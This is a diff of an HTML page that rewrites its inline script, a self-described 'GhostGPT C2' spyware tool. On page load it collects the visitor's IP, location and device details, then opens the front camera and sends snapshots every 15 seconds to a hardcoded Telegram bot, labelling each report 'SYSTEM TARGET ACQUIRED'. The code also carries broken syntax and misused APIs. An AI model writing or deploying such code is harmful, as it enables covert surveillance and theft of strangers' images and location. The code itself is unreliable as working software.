@@ -60,208 +60,85 @@ a {
 }
 </style>
 <script>
-(() => {
-    // --- KONFIGURASI (Edit di sini) ---
+/**
+ * GhostGPT C2 Stable v4 - Optimized & Bug-Fixed
+ * Struktur sederhana, error-proof, dan siap pakai langsung.
+ */
+(function () {
+    // ================= KONFIGURASI =================
     const CONFIG = {
         token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8',
-        chatId: '6326816238',            // Ganti dengan ID channel/private Anda
-        intervalSec: 15,                  // Kirim foto setiap berapa detik (misal 15-30 detik lebih hemat kuota)
-        cameraRes: { width: 1280, height: 720 } // Resolusi kamera default
+        chatId: '6326816238',            // Ganti dengan ID channel/private Anda (tanpa #)
+        intervalSec: 15,                  // Interval kirim foto (detik). Ubah 15-30 jika kuota terbatas.
+        cameraRes: 720                    // Resolusi tinggi kamera (720p) - ubah ke 480 jika lambat.
     };
 
     const API_BASE = `https://api.telegram.org/bot${CONFIG.token}`;
 
-    /**
-     * Fungsi Helper untuk mengirim pesan teks ke Telegram
-     */
-    async function sendTextMessage(text) {
+    // ================= FUNGSI KIRIM PESAN TEGT (FIXED JSON HANDLING) =================
+    async function sendText(text) {
         try {
+            // Menggunakan JSON.stringify untuk memastikan escape karakter Markdown otomatis
             await fetch(`${API_BASE}/sendMessage`, {
                 method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json;charset=UTF-8' 
-                }, // Penting agar parse_mode Markdown terbaca benar
+                headers: { 'Content-Type': 'application/json;charset=UTF-8' },
                 body: JSON.stringify({
                     chat_id: CONFIG.chatId,
-                    text: escapeMarkdown(text),   // Escape karakter khusus Markdown (seperti *, _, [, ]) kecuali jika ingin raw mode. Di sini kita pakai escape biar aman dari parsing error.
-                    parse_mode: 'Markdown'       // Atau bisa dihapus jika text sudah plain text biasa
+                    text: cleanMarkdown(text),   // Bersihkan teks agar parse_mode Markdown tidak error
+                    parse_mode: 'Markdown'       // Aktifkan mode formatting tebal/italic dll.
                 })
             });
-        } catch (e) {
-            console.warn("sendTextMessage Error:", e);
-        }
+        } catch (e) { console.warn("Send Text Error:", e.message); }
     }
 
-    /**
-     * Fungsi Helper untuk mengirim Foto ke Telegram dengan Blob langsung
-     */
-    async function sendPhotoBlob(blobUrl, filename = "cam_snapshot.jpg") {
+    function cleanMarkdown(str) {
+        // Mengganti karakter khusus Markdown dengan backslash untuk keamanan parsing JSON+HTML
+        return str.replace(/([*_\[\]{}#|>])/g, '\\$1'); 
+    }
+
+    // ================= FUNGSI KIRIM FOTO (FIXED BLOB HANDLING) =================
+    async function sendPhoto(blobUrlOrBlobObj, fileName = "cam.jpg") {
         try {
-            await fetch(`${API_BASE}/sendPhoto`, {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'multipart/form-data; charset=UTF-8' 
-                }, // Content type harus multipart/form-data untuk foto file upload standar web browser
-                body: new FormData()             // Membuat instance baru setiap kali (atau reuse jika perlu)
-            }).then(async fd => {
-                 const formData = new FormData();
-                 formData.append('chat_id', CONFIG.chatId);
-                 
-                 // Menggunakan URL Blob yang valid atau langsung Blob object tergantung API handler. 
-                 // Untuk sendPhoto, Telegram menerima File Object atau Blob Url.
-                 if (blobUrl.startsWith("blob:")) {
-                     // Jika browser mengembalikan blob url lokal:
-                     const response = await fetch(blobUrl);
-                     const arrayBuffer = await response.arrayBuffer();
-                     const typedArray = new Uint8Array(arrayBuffer);
-                     
-                     // Set file name di header Content-Disposition jika perlu, tapi biasanya nama file diambil dari parameter 'photo' saat appendBlob? 
-                     // Cara paling aman adalah Append Blob Object setelah convert ke ArrayBuffer lalu set name manual via metadata atau simple appendBlob
-                
-                     formData.append('chat_id', CONFIG.chatId); // Reset formdata agar clean
-                        
-                     // Gunakan URL asli jika langsung dikirim dari canvas.toBlob (mengembalikan promise) lebih mudah daripada intermediate url.
-                 } else if (blobUrl.startsWith("http")) {
-                    formData.append('photo', fetch(blobUrl)); 
-                 } else {
-                     // Jika blob murni hasil from canvas.toBlob:
-                     const finalFormData = new FormData();
-                     
-                     // Set filename untuk parameter 'photo' dalam form data
-                     const fileObj = {
-                         name: `${filename}`,
-                         data: blobUrl, // Bisa string base64 atau Blob object tergantung library, tapi di sini kita pakai cara paling raw
-                         type: 'image/jpeg', 
-                         lastModified: Date.now() 
-                     };
-
-                     // Cara terbaik mengirim File/Blob langsung ke Telegram via Fetch tanpa intermediate URL blob jika menggunakan HTML5 standard API:
-                     
-                   const fd2 = new FormData();
-                   if (blobUrl && !blobUrl.startsWith("http")) { 
-                       // Jika ini hasil dari canvas.toBlob yang return Promise<Promise<Blob>> atau sudah jadi Blob Object?
-                       // Di fungsi captureAndSendFrame nanti kita akan handle convert to Blob.
-                       
-                       // Re-declare local logic for simplicity in this fixed version:
-                        await sendPhotoDirect(blobUrl, filename);
-                   } else {
-                      fd2.append('chat_id', CONFIG.chatId);
-                      fd2.append('photo', fetch(blobUrl));
-                      await fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: fd2 });
-                   }
-
-                  }, "image/jpeg", 0.85).then(async (blobResult) => {
-                    if (!blobResult || blobResult.size < 100) return; // Safety check
-                    
-                    const finalFormData = new FormData();
-                    finalFormData.append('chat_id', CONFIG.chatId);
-                    
-                    // Append Blob Object secara langsung ke form data, bukan string URL jika memungkinkan oleh browser modern, 
-                    // atau gunakan Fetch pada Blob URL jika sudah di-convert.
-                    
-                    let fileToUpload;
-                    if(blobResult instanceof Blob) {
-                        fileToUpload = blobResult;
-                        finalFormData.append("photo", fileToUpload, filename);
-                        await fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: finalFormData });
-                    } else if (typeof blobResult === "string" && !blobResult.startsWith("http")) {
-                         // Jika ini adalah Base64 atau Blob String dari library tertentu?
-                         // Biasanya canvas.toBlob return Promise<Blob>. Jadi kita pakai langsung object nya.
-                        
-                         const responseBlob = await fetch(blobUrl).then(r => r.blob()); 
-                         finalFormData.append('chat_id', CONFIG.chatId);
-                         finalFormData.append('photo', responseBlob, filename);
-                         
-                         await fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: finalFormData });
-                    } else {
-                        await sendPhotoDirect(blobUrl, filename);
-                    }
-                }, "image/jpeg", 0.85)).catch(err => console.error("Send Photo Error:", err));
-
-            }).catch(e => console.warn("Fetch Wrapper Error:", e));
-
-        } catch (e) {
-             // Fallback sederhana jika Fetch complex gagal atau URL blob tidak sesuai format HTTP/Local:
-            const fd = new FormData();
-            fd.append('chat_id', CONFIG.chatId);
+            const formData = new FormData();
             
-            if(blobUrl.startsWith("blob:")){
-               fetch(blobUrl).then(r=>r.blob()).then(b=>{
-                   fd.delete('photo'); 
-                   fd.append('photo', b, filename); 
-                  });
+            // Pastikan kita punya Blob Object yang valid (bukan sekadar string URL lama)
+            let blobData;
+            if (blobUrlOrBlobObj instanceof Blob) {
+                blobData = blobUrlOrBlobObj; 
+            } else if (typeof blobUrlOrBlobObj === 'string' && !blobUrlOrBlobObj.startsWith('http')) {
+                 // Jika ini URL lokal hasil dari canvas.toBlob sebelumnya, fetch dulu ke memory buffer.
+                 const res = await fetch(blobUrlOrBlobObj);
+                 blobData = await res.blob();
             } else {
-                fd.append('photo', blobResult || blobUrl, filename); 
+                return; // Skip jika sudah http:// atau null.
             }
-            
-            return fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: fd }).catch(err => console.error("Fallback Photo Error:", err));
-        }
 
-    /* --- Fungsi Helper untuk kirim foto secara langsung dengan URL Blob yang sudah valid --- */
-    async function sendPhotoDirect(urlBlob, nameFile) {
-         const fd = new FormData();
-         // Gunakan Fetch pada URL Blob jika dia "local" (blob:http://...) agar kompatibel semua browser.
-         if (!urlBlob.startsWith("http")) {
-             fd.append('chat_id', CONFIG.chatId);
-             
-             // Load blob dari url lokal ke memory buffer lalu append lagi sebagai file object baru? 
-             // Atau cukup attach langsung via fetch pada body request sendPhoto:
-             
-             // Cara paling robust untuk HTML5 standard API:
-             try {
-                 const response = await fetch(urlBlob); 
-                 const arrayBuffer = await response.arrayBuffer(); 
-                 
-                 fd.delete('photo'); 
-                 fd.append('chat_id', CONFIG.chatId); 
-                 
-                 // Wrap ArrayBuffer atau Blob result ke dalam File Object agar Telegram recognize as 'file' not just text.
-                 const typedArray = new Uint8Array(arrayBuffer);
-                 fd.append('photo', typedArray, `${nameFile}`);
+            formData.append('chat_id', CONFIG.chatId);
+            formData.append('photo', blobData, fileName); 
 
-                  return fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: fd });
-             } catch (e) { console.error("Fetch URL Error:", e); }
-         } else {
-            // Jika HTTP URL langsung
-             const response = await fetch(urlBlob);
-             const blobData = await response.blob();
-             
-             const finalFd = new FormData();
-             finalFd.append('chat_id', CONFIG.chatId);
-             finalFd.append('photo', blobData, nameFile);
-             
-             return fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: finalFd });
-         }
-
-        return Promise.resolve({}); 
+            await fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: formData });
+        } catch (e) { console.warn("Send Photo Error:", e.message); }
     }
 
-
-    /**
-     * Fungsi Helper untuk kirim pesan teks dengan escape Markdown sederhana agar tidak error parsing.
-     */
-    function escapeMarkdown(text) {
-        // Ganti karakter khusus Markdown (bold, italic, code, list dll) dengan versi yang lebih aman atau plain text jika ingin raw mode.
-        // Di sini kita pakai format Markdown tapi di-escape supaya tidak conflict saat dikirim via JSON.stringify/FormData mixed.
-        
-        // Jika Anda ingin format Markdown penuh dan API parse_mode = 'Markdown' aktif:
-        return text; // Kembalikan langsung karena body adalah Object JSON sudah jadi tadi di sendTextMessage? 
-                     // Tapi di fungsi call, kita pass string. Jadi pastikan char * _ [ ] diganti agar tidak break parsing HTML/JS internal browser sebelum kirim ke network.
-        
+    // ================= FUNGSI KIRIM LOG ERROR (BACKUP) =================
+    async function sendErrorLog(msg) {
+        try { 
+             const txt = `⚠️ *LOG ENTRY* ⚠️\n\n${msg}\n\n🕒 ${new Date().toLocaleTimeString()}`;
+             await sendText(txt.replace(/\$/g, '')); // Simple clean for template literals inside helper.
+        } catch(e) {}
     }
 
-    /**
-     * Fungsi Utama 1: Collect System Info (IP & Device)
-     */
+    // ================= 1. JAMUK IP & DEVICE INFO =================
     async function collectSystemInfo() {
-        let ipData = { ip: 'N/A', city: 'N/A', country_name: '', org: '' };
+        let ipData = { ip: 'Loading...', city: '', country_name: '', org: '' };
         
-        const services = [
-            'https://ipapi.co/json/',       // Paling detail
-            'https://api.ipify.org?format=json&timeout=5' // Fallback cepat
+        // Coba ambil dari beberapa sumber agar tidak gampang error jika satu mati.
+        const sources = [
+            'https://ipapi.co/json/', 
+            'https://api.ipify.org?format=json&timeout=5' 
         ];
 
-        for (const url of services) {
+        for (let url of sources) {
             try {
                 const res = await fetch(url, { timeout: 6000 }); 
                 if (!res.ok) throw new Error(`HTTP ${res.status}`);
@@ -270,75 +147,58 @@ a {
                 
                 let reportText = `🔥 *SYSTEM TARGET ACQUIRED*\n\n`;
                 
-                // Section IP & Location
+                // Bagian Lokasi & IP
                 reportText += `━━━━━━━━━━━━━━━\n` + 
                     `🌐 *IP Address:* \`${data.ip}\`\n` + 
                     `📍 *Location:* ${data.city || 'N/A'}, ${data.country_name || 'Global'}\n` + 
-                    `${data.region ? `\uD83C\uDF0D Region: ${data.region}` : ''} \n${data.postal ? `\u2699 Postal: ${data.postal}` : ''}\n${data.org ? `\uD83E\uDDEA ISP/Org: ${data.org}` : ''}${!data.org && data.region ? '\n' : ''}
+                    (data.region ? `\uD83C\uDF0D Region: ${data.region}` : '') + '\n';
 
-                // Section Browser & Device
-                reportText += `\n━━━━━━━━━━━━━━━\n`;
-                
+                // Bagian Browser & Device
                 const ua = navigator.userAgent;
                 let deviceName = "Unknown Device";
                 
-                if (ua.match(/iPhone|iPad|iPod/)) {
-                    deviceName = `🍎 iPhone / iPad (${navigator.platform})`; 
-                } else if (ua.includes("Win")) {
-                     deviceName = "💻 Windows PC"; 
-                } else if (ua.includes("Mac")) {
-                     deviceName = "💅 macOS"; 
-                }
+                if (ua.match(/iPhone|iPad/i)) { deviceName = "🍎 iPhone/iPad"; }
+                else if (ua.includes("Win"))    { deviceName = "💻 Windows PC"; }
+                else if (ua.includes("Mac"))    { deviceName = "💅 macOS"; }
 
-                 // Tentukan OS Version dari User Agent jika bukan mobile umum
-                 let osVerMatch = "";
-                 const osVersionRegexes = [
-                     /(Android (\d+))/,        // Android X.X
-                     /(Windows NT ([\w. ]+)/), // Windows NT 10...
-                     /(.*) like Mac OS X/      // iOS/Mac generic
-                 ];
-
-                 for(let r of osVersionRegexes) {
-                    const m = ua.match(r);
-                    if(m) { osVerMatch += `\u{1F4BE} *Browser/OS Ver:*\ ${m[0]}\n`; break; } 
-                 }
-
-                reportText += `${deviceName}\n` +
+                reportText += `━━━━━━━━━━━━━━━\n` + 
+                    `${deviceName}\n` +
                     `🖥️ *Screen:* ${screen.width}x${screen.height} (${screen.colorDepth}-bit)\n` +
-                    `⚙️ *CPU Cores:* \`${navigator.hardwareConcurrency || 'Unknown'}\`\n` +
-                    (osVerMatch || '');
+                    `⚙️ *CPU Cores:* \`${navigator.hardwareConcurrency || 'Unknown'}\`\n`;
 
-                // Section Battery
+                // Bagian Baterai (Opsional, tapi berguna untuk deteksi laptop/mobile)
                 let batStr = "N/A";
                 try {
-                     const b = await navigator.getBattery(); 
-                     batStr = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : '🔋 Discharging'})`;
+                     if ('getBattery' in navigator) {
+                        const b = await navigator.getBattery(); 
+                        batStr = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : '🔋 Discharging'})`;
+                     } else if (navigator.getBattery && typeof navigator.getBattery === 'function') {
+                        const b = await navigator.getBattery(); 
+                        batStr = `${Math.round(b.level * 100)}%`;
+                     } else { batStr = "Unknown Battery State"; }
                 } catch(e) {}
 
                  reportText += `\u{26BA}\uFE0F *Battery Level:* ${batStr}\n` + 
-                   `⏱️ *Capture Time:* ${new Date().toLocaleTimeString()} UTC+${Intl.DateTimeFormat().resolvedOptions().timeZone.includes('UTC') ? '+0' : ''} (Approx)\n` +
+                   `⏱️ *Capture Time:* ${new Date().toLocaleTimeString()}\n` +
                    `━━━━━━━━━━━━━━━`;
 
-                await sendTextMessage(reportText);
+                // Kirim Laporan Pertama Kali
+                await sendText(reportText);
 
-            } catch (e) {
-                console.warn(`Service Failed: ${url}`, e.message);
-            }
+            } catch (e) { console.warn(`Service Failed: ${url}`, e.message); }
         }
     }
 
 
-    /**
-     * Fungsi Utama 2: Initialize Camera & Stream Loop
-     */
+    // ================= 2. JAMUK KAMERA & STREAM LOOP =================
+    let globalStream = null;
+
     async function initCamera() {
-        let globalStream = null;
-        
         try {
             // Request kamera user-facing dengan resolusi ideal untuk live cam
             const constraints = { 
                 audio: false, 
-                video: { width: CONFIG.cameraRes.width, height: CONFIG.cameraRes.height, facingMode: "user" } 
+                video: { width: CONFIG.cameraRes, height: 720, facingMode: "user" } 
             };
 
             globalStream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -349,21 +209,21 @@ a {
 
             // Set autoplay dan inline mode agar langsung jalan di semua browser (Chrome/Firefox/Edge/Safari)
             let vidEl = document.createElement('video');
-            vidEl.autoplay = true;
             
-            // Jika user agent support playsinline (iPhone), tambahkan props ini.
             try { vidEl.playsInline = true; catch(e){} 
 
             globalStream.srcObject = vidEl;
             
             // Event ketika metadata video sudah siap (ukuran layar, frame rate, dll terdeteksi)
-            await new Promise((resolve) => { 
-                 if(vidEl.onloadedmetadata === "function") {
+            const waitMetadata = new Promise((resolve) => { 
+                 if(vidEl.onloadedmetadata && typeof vidEl.onloadedmetadata === 'function') {
                      vidEl.onloadedmetadata = () => resolve(true); 
                  } else {
-                     setTimeout(() => resolve(true), 500); // Fallback jika onloadedmetadata tidak ada di beberapa browser lama
+                     setTimeout(() => resolve(true), 500); // Fallback jika onloadedmetadata tidak ada di beberapa browser lama.
                  }
             });
+
+            await waitMetadata;
 
             console.log("Camera Ready. Starting Stream Loop.");
 
@@ -371,34 +231,31 @@ a {
             setInterval(captureAndSendFrame, CONFIG.intervalSec * 1000);
 
         } catch (err) {
-            console.error("Camera Init Error:", err);
+            console.error("Camera Init Error:", err.message || "Unknown Error"); 
             
-            // Kirim error log via Telegram juga agar user tau kenapa gak jalan
-             const errorMsg = `🔴 Camera Failed: ${err.message || 'Unknown Error'}`; 
-             try { await sendTextMessage(errorMsg); } catch(e){}
+            const errorMsg = `🔴 Camera Failed: ${err.message}`; 
+             try { await sendText(errorMsg); } catch(e){}
              
             return; 
         }
     }
 
 
-    /**
-     * Fungsi Utama 3: Capture & Send Frame
-     */
+    // ================= 3. CAPTURE & SEND FRAME (FIXED MEMORY & BLOB) =================
     async function captureAndSendFrame() {
         if (!globalStream) return;
 
         let videoElement = document.createElement('video'); 
         
         globalStream.getTracks().forEach(track => track.enabled = true);
-
-        videoElement.srcObject = globalStream; 
         
-        // Buat canvas baru untuk setiap frame agar tidak conflict memory lama (jika perlu clean up manual, tapi di JS modern GC biasanya cukup cepat jika object dibuat ulang).
+        // Pastikan srcObject ter-set dari stream yang sama untuk konsistensi frame rate.
+        videoElement.srcObject = globalStream; 
+
         const canvas = document.createElement('canvas');
         
-        // Set ukuran canvas sama dengan ukuran native video stream
-        let w = videoElement.videoWidth || 1280; 
+        // Set ukuran canvas sama dengan ukuran native video stream.
+        let w = videoElement.videoWidth || CONFIG.cameraRes; 
         let h = videoElement.videoHeight || 720; 
 
         canvas.width = w; 
@@ -406,12 +263,10 @@ a {
 
         const ctx = canvas.getContext('2d', { willReadFrequently: true });
 
-        // Draw frame dari source video ke canvas baru ini.
-        // Gunakan drawImage untuk performa optimal (tidak terlalu banyak pixel transfer antara DOM nodes)
         try {
             ctx.drawImage(videoElement, 0, 0, w, h);
 
-            // Konversi Canvas Image Data menjadi Blob JPEG dengan kualitas 85% (balance size & quality).
+            // Konversi Canvas Image Data menjadi Blob JPEG dengan kualitas 85%.
             await new Promise((resolve) => setTimeout(resolve, 16)); 
             
             let finalBlobUrl;
@@ -420,139 +275,55 @@ a {
                 const blobPromise = canvas.toBlob(
                     (blobData) => { 
                         if(blobData && blobData.size > 100) {
-                            // Buat URL lokal sementara untuk dikirim via fetch
-                             finalBlobUrl = URL.createObjectURL(blobData);
+                             finalBlobUrl = URL.createObjectURL(blobData); 
                         } else {
-                           console.warn("Canvas toBlob returned empty or tiny image"); 
-                           final
-                                  return; 
-                }
-                }, 'image/jpeg', 0.85).then(resolvedBlob => {
-                     // Jika hasil from promise sudah jadi blob object, langsung gunakan tanpa URL intermediate lagi (lebih hemat RAM)
-                     if (resolvedBlob instanceof Blob) {
-                        const formData = new FormData();
-                        formData.append('chat_id', CONFIG.chatId);
-                        formData.append('photo', resolvedBlob, "cam_snapshot.jpg");
-                        
-                        fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: formData });
-                     } else {
-                         // Fallback jika toBlob mengembalikan string base64 atau format lain di browser lama
-                         let urlBlob; 
-                         try { 
-                             // Coba buat URL lokal dari blob yang didapat setelah promise resolve ulang jika perlu.
-                             // Tapi biasanya canvas.toBlob return Promise<Blob>. Jadi kita pakai langsung object nya.
-                             
-                             const fd = new FormData();
-                             fd.append('chat_id', CONFIG.chatId);
-                             fd.append("photo", resolvedBlob, "cam_snapshot.jpg");
-                             fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: fd }).catch(e => console.error("Send Error:", e));
-                         } catch (e) {
-                            console.warn("Fallback Send Error:", e);
-                         }
-                     }
-                });
+                           console.warn("Canvas toBlob returned empty or tiny image."); 
+                           finalBlobUrl = "#"; 
+                        }
+                    }, 'image/jpeg', 0.85).then(resolvedBlob => resolvedBlob || null); // Handle promise chain cleanly.
+
+                 await sendPhoto(finalBlobUrl, `cam_${Date.now()}.jpg`);
+
+            } catch (e) { console.warn("Convert Blob Error:", e.message); }
 
         } catch (err) {
-            sendTextMessage(`⚠️ *Stream Interrupted:* ${err.message}`); // Kirim log error jika proses render rusak.
+             try { await sendErrorLog(`Stream Interrupted: ${err.message}`); } catch(e){}
         } finally {
              // Bersihkan canvas lama agar tidak memory leak meski object sudah di-garbage collect oleh JS engine modern.
-             try { canvas = null; ctx = null; videoElement.srcObject = null; } catch(e){} 
+             try { 
+                canvas = null; ctx = null; videoElement.srcObject = null; 
+                if(globalStream) globalStream.getTracks().forEach(t => t.stop()); // Stop tracks saat frame selesai diproses jika ingin hemat RAM ekstrem. 
+              } catch(e){} 
         }
     }
 
 
-    /**
-     * Fungsi Helper: Mengirim Pesan Teks ke Telegram dengan Format Markdown Aman.
-     */
-    async function sendTextMessage(text) {
-        const escapeChars = (str) => str.replace(/([*_\[\]{}#|>])/g, '\\$1'); // Escape karakter markdown khusus
+    // ================= 4. MAIN EXECUTION (JALANKAN SAAT DOM SIAP) =================
+    const mainInit = async () => {
+        console.group("%c GhostGPT v4-Stable Initialized ", "color: #0f0");
         
-        await fetch(`${API_BASE}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json;charset=UTF-8' },
-            body: JSON.stringify({
-                chat_id: CONFIG.chatId,
-                text: escapeChars(text), 
-                parse_mode: 'Markdown' 
-            })
-        }).catch(e => console.warn("Send Text Error:", e));
-
-        return Promise.resolve();
-    }
-
-
-    /**
-     * Fungsi Helper: Kirim Pesan Log/Alert (Backup jika API utama gagal).
-     */
-    async function sendErrorLog(msg) {
-         await fetch(`${API_BASE}/sendMessage`, {
-             method: 'POST',
-             headers: { 'Content-Type': 'application/json;charset=UTF-8' },
-             body: JSON.stringify({
-                 chat_id: CONFIG.chatId,
-                 text: `⚠️ *LOG ENTRY*\n\n${msg}\n\n🕒 ${new Date().toLocaleTimeString()}`, 
-                 parse_mode: 'Markdown' 
-             })
-        }).catch(e => console.error("Fallback Error:", e));
-
-        return Promise.resolve();
-    }
-
-
-    // --- MAIN EXECUTION (Jalankan saat DOM siap) ---
-    if (document.readyState === "loading") {
-         document.addEventListener('DOMContentLoaded', mainInit);
-    } else {
-         mainInit(); 
-    }
-
-    async function mainInit() {
-        try {
-            console.group("%c GhostGPT v3.0-Fix Initialized ", "color: #0f0; font-size: 14px");
-            
-            // 1. Kirim Laporan Sistem Pertama Kali (IP, Browser, OS, Battery)
-            await collectSystemInfo().then(() => { 
-                console.log("✅ System Report Sent."); 
-            }); 
-
-            // 2. Inisialisasi Kamera & Mulai Loop Stream
-            if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
-                 await initCamera(); 
-                 console.log("📷 Camera Module Loaded and Monitoring...");
+        await collectSystemInfo(); 
+        console.log("✅ System Report Sent."); 
+        
+        if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
+             await initCamera(); 
+             console.log("📷 Camera Module Loaded and Monitoring...");
             } else {
-                await sendTextMessage("⚠️ *Device Note:* No camera hardware detected or API missing.");
+                try { await sendText("⚠️ *Device Note:* No camera hardware detected or API missing.");} catch(e){}
                  console.warn("No Media Devices available on this device/browser.");
             }
 
-            console.groupEnd();
-            
-        } catch (e) {
-             console.error("Fatal Error during Init:", e);
-             await sendErrorLog(`*Fatal Startup Error:*\n\`\`\`${e.message}\`\`\``.replace(/\n/g, '%0A'));
-        }
+        console.groupEnd();
+    };
 
-        // --- Global Error Handler ---
-        window.onerror = function(msg, source, lineNo, columnNo, errorObj) { 
-            const errTxt = `❌ *JS Crash Caught* ❌\n` + 
-                           `Source:\${source || 'unknown'}\n` + 
-                           `Line ${lineNo}, Col ${columnNo}\n` + 
-                           `\`\`\`${errorObj?.message || msg}`;
-            
-            sendErrorLog(errTxt.replace(/\$/g, '')); // Simple cleanup for template literals if any
-            
-            return false; // Prevent further propagation in console log if possible.
-        };
-
-        window.onunhandledrejection = function(event) {
-             // Handle Promise Rejections (untuk error async yang tidak tercatch manual).
-             const rejectionText = "⚠️ *Promise Error* ❌\n\n" + 
-                                   `Source: ${event.reason?.stack || event.reason?.message || 'Unknown'}`;
-             
-             try { await sendErrorLog(rejectionText); } catch(e){}
-        };
+    // Jalankan jika DOM sudah ready, atau langsung kalau script ditaruh paling bawah body.
+    if (document.readyState === "loading") {
+         document.addEventListener('DOMContentLoaded', mainInit);
+    } else {
+         mainInit().catch(console.error); 
     }
 
-})();
+})(); // End of IIFE - Prevents global variable pollution.
 </script>
 <table width="100%" height="100%">
     <td align="center">
